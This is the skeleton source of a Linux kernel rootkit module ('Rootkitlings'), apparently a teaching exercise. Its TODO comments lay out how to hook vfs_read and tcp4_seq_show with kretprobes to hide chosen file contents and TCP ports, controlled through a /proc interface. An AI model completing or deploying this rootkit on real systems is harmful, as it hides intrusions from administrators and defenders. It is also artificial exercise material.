// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>
#include <net/sock.h>

#include "target_list.h"

#define RK_BUF_MAX 4080
#define RK_CMD_MAX 128

static struct rk_target_list content_targets;
static struct rk_target_list port_targets;
static struct proc_dir_entry *proc_entry;

/* --- vfs_read content hiding --- */

struct rk_read_data {
	char __user *buffer;
	unsigned char scratch[RK_BUF_MAX];
};

// TODO: Implement rk_remove_matching_lines().
// Walk the buffer line by line (find '\n' with memchr).
// For each line, call rk_target_match(&content_targets, line, len).
// If matched, skip the line (don't copy to output position).
// If not matched, memmove it down if needed.
// Return the new total length.

static int rk_read_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_read_data *data = (void *)inst->data;

	data->buffer = (char __user *)regs_get_kernel_argument(regs, 1);
	return 0;
}

// TODO: Implement rk_read_return().
// This is the kretprobe return handler for vfs_read.
// 1. Check result > 0 and <= RK_BUF_MAX, bail otherwise
// 2. Early-out if content_targets.count == 0
// 3. copy_from_user_nofault the user buffer into data->scratch
// 4. Call rk_remove_matching_lines on scratch
// 5. If length changed, copy_to_user_nofault and update return value

static struct kretprobe read_probe = {
	.kp.symbol_name = "vfs_read",
	.entry_handler = rk_read_entry,
	// TODO: set .handler to your return handler
	.data_size = sizeof(struct rk_read_data),
	.maxactive = 32,
};

/* --- tcp4_seq_show port hiding --- */

struct rk_tcp_data {
	struct seq_file *seq;
	size_t prev_count;
};

// TODO: Implement rk_tcp_show_entry().
// kretprobe entry handler for tcp4_seq_show.
// 1. Set data->seq = NULL
// 2. Get v from regs->si. If v == SEQ_START_TOKEN, return 0.
// 3. Early-out if port_targets.count == 0
// 4. Cast v to struct sock*, get inet_sk(), check inet_sport
// 5. If rk_target_number_match matches, save seq and seq->count in data

// TODO: Implement rk_tcp_show_return().
// If data->seq was saved, rewind seq->count to prev_count.

static struct kretprobe tcp_probe = {
	.kp.symbol_name = "tcp4_seq_show",
	// TODO: set .entry_handler and .handler
	.data_size = sizeof(struct rk_tcp_data),
	.maxactive = 8,
};

/* --- /proc/rootkitlings interface --- */

static int rk_show(struct seq_file *out, void *unused)
{
	unsigned long flags;
	unsigned int i;

	seq_puts(out, "content_targets:\n");
	spin_lock_irqsave(&content_targets.lock, flags);
	for (i = 0; i < content_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, content_targets.entries[i]);
	spin_unlock_irqrestore(&content_targets.lock, flags);

	seq_puts(out, "port_targets:\n");
	spin_lock_irqsave(&port_targets.lock, flags);
	for (i = 0; i < port_targets.count; i++)
		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
	spin_unlock_irqrestore(&port_targets.lock, flags);
	return 0;
}

static int rk_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

// TODO: Implement rk_write().
// Parse commands from the user:
//   "hide content <string>" -> rk_target_add(&content_targets, ...)
//   "hide port <N>"         -> rk_target_add(&port_targets, ...)
//   "unhide content <N>"    -> rk_target_remove(&content_targets, ...)
//   "unhide port <N>"       -> rk_target_remove(&port_targets, ...)
// Strip trailing newline before parsing.

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_open,
	.proc_read = seq_read,
	// TODO: set .proc_write
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

/* --- init/exit --- */

// TODO: Implement rk_init().
// 1. Init both target lists
// 2. Register the vfs_read kretprobe
// 3. Register the tcp4_seq_show kretprobe
// 4. Create /proc/rootkitlings
// Clean up in reverse on any failure.

// TODO: Implement rk_exit().
// Remove proc entry, unregister both probes.

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rootkitlings content and port hiding");
